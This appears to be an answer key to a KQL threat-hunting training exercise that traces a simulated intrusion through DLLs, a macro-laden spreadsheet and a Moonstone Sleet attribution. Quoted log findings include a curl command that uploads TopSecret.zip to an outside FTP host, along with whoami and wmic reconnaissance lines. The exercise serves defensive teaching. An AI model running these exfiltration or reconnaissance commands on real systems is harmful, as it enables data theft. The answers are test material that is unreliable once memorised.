Which role did most of the employees have?
Email
| where link has "DeTankWar"
| distinct recipient
| join kind=inner Employees on $left.recipient==$right.email_addr
| distinct email_addr, name, role
Answer: Defense Engineer


Section 3: Perfectly Executed
The threat intelligence article mentions two malicious DLLs that may be included with the tank game: NVUnityPlugin.dll or Unityplayer.dll. Query the logs to see if either of those files show up in our environment. How many results did this query return?
FileCreationEvents
| where filename in~ ("nvunityplugin.dll","unityplayer.dll")
Answer: 6

What is the Sha256 hash of the file you found?
Answer: 09d152aa2b6261e3b0a1d1c19fa8032f215932186829cfcca954cc5e84a6cc38

This hash is attributed in the Microsoft Defender XDR portal to which threat actor?
Answer: Moonstone Sleet

The threat intel article mentions the attacker used this malware to conduct hands-on-keyboard data exfiltration from compromised systems. At the bottom of the threat intel article, two specific C2 domain indicators of compromise (IOCs) are provided. Query the data to see if there is any evidence they were used in the environment. What is the full process_commandline executed using this domain?
ProcessEvents
| where process_commandline has "curl" and process_commandline  has_any ("mingeloem.com","matrixane.com")
Answer: curl -T C:\ReadyToGo\TopSecret.zip ftp://matrixane.com/upload/ --user exfil:tankpass

Let's check what TopSecret.zip might contain. What is the -Path argument provided to Compress-Archive?
ProcessEvents
| where process_commandline has "TopSecret.zip"
Answer: C:\StagingArea\*

What is the -Path argument provided to Copy-Item?
ProcessEvents
| where process_commandline has "StagingArea"
Answer: \\company_share\confidential\defense\project_omega\*


Section 4: A Love Story
There a screenshot of an alert. It shows "whoami" was run on user chtaylor's device.
First, find chtaylor's hostname before we can pivot on it. What is chtaylor's hostname?
Employees
| where username == "chtaylor"
Answer: IL5M-DESKTOP

When was this process executed on Taylor's machine?
ProcessEvents
| where hostname == "<enter hostname here>"
| where process_commandline has "whoami"
Answer: 2024-07-20T03:58:19.000Z

What was the exact process that was executed?
Look at the full process_commandline result.
Answer: cmd.exe /c echo PC and User Names -------- >>%temp%\Logs.txt && whoami >>%temp%\Logs.txt

Check if other similar commands ran on this machine. How many similar processes are there on Taylor's machine?
ProcessEvents
| where hostname == "<taylor's hostname>"
| where process_commandline has_all("echo", ">>", "logs.txt")
Answer: 39

In these processes, someone (or something) appears to be running various commands and logging + dumping them to a folder on disk. What is the path, including the filename, where these commands are being dumped?
Look at the full command: cmd.exe /c echo Date and Time -------- >>%temp%\Logs.txt && date /t >>%temp%\Logs.txt && time /t >>%temp%\Logs.txt
Answer: %temp%\Logs.txt

In one of the commands, they are pinging the domain of a russian email provider. Which domain is this?
ProcessEvents
| where process_commandline contains "ping"
| where hostname == "IL5M-DESKTOP"
This one looks suspicious: cmd.exe /c echo Ping Status -------- >>%temp%\Logs.txt && ping yandex.com -n 1 >>%temp%\Logs.txt
Answer: yandex.com

In another one of these commands, the actor is using wmic to get software info from the machine. The results of this command are also dumped into the log file. What command do they execute? (not the full command line, just the relevant wmic part)
Result: cmd.exe /c echo Software -------- >>%temp%\Logs.txt && wmic product get name,version >>%temp%\Logs.txt
Answer: wmic product get name,version

It would help to know if Taylor is expected to run a program such as this. What is Taylor's job role?
Employees
| where name contains "Christopher Taylor"
Answer: Network Engineer

We'll just broaden our previous query to see if anyone else used the commands that dumped info to logs.txt. How many total hits do we get?
ProcessEvents
| where process_commandline has_all("echo", ">>", "logs.txt")
Answer: 663
This means a lot of data was potentially exfiltrated if so many commands writing to the previously-used Logs.txt were used.

On how many distinct hostnames do we see these commands running?
ProcessEvents
| where process_commandline has_all("echo", ">>", "logs.txt")
| distinct hostname
Answer: 15

Are they all supposed to be doing this kind of thing? What is the most prevalent job role for these employees?
let hosts =
ProcessEvents
| where process_commandline has_all("echo", ">>", "logs.txt")
| distinct hostname;
Employees
| where hostname has_any (hosts)
By far the most common role is Network Engineer.

What other job role do we see?
Answer: Senior Network Engineer

After much discussion, no one has any idea where these commands are coming from. Drill back down on Taylor's computer to find the source of these commands. What was the earliest time we saw one of these suspicious commands getting run on Taylor's computer?
ProcessEvents
| where hostname == "IL5M-DESKTOP"
| where process_commandline has_all("echo", ">>", "logs.txt")
Answer: 2024-07-17T10:47:43.000Z

Right before that, we saw a suspicious macro getting run on the same machine. What was that full command?
ProcessEvents
| where hostname == "IL5M-DESKTOP"
| where timestamp < datetime(2024-07-17T10:47:43.000Z)
| sort by timestamp desc  
Answer: C:\temp\macro.xlsm

Right before the macro command, we see an xlsx file getting executed on Taylor's machine. What was the name of that file?
The very next command we see is: "C:\Program Files\Microsoft Office\Office16\EXCEL.EXE" "C:\Users\chtaylor\Downloads\New_Diet_Plan_For_My_Love.xlsx"
Answer: New_Diet_Plan_For_My_Love.xlsx

We can look in FileCreationEvents for that file. What is the sha256 hash of the file?
FileCreationEvents
| where hostname == "<taylor's hostname>"
| where filename  == "<file name of interest>"
Answer: 6aeef036eb85a470dbd6d039250172a510a8627b873e8b3b79fae5a7dd767e73

What is the process data associated with the creation of that file?
Edge.exe

OutboundNetworkEvents
| take 10
Find which column would be most likely to tell us which website we got the file from.
Answer: url

What is Taylor's IP address?
10.10.0.79

What URL did Taylor download this file from?
OutboundNetworkEvents
| where src_ip == "<taylor's ip>"
| where url has "<file name of interest>"
Answer: https://healthylifestyle.com/share/New_Diet_Plan_For_My_Love.xlsx


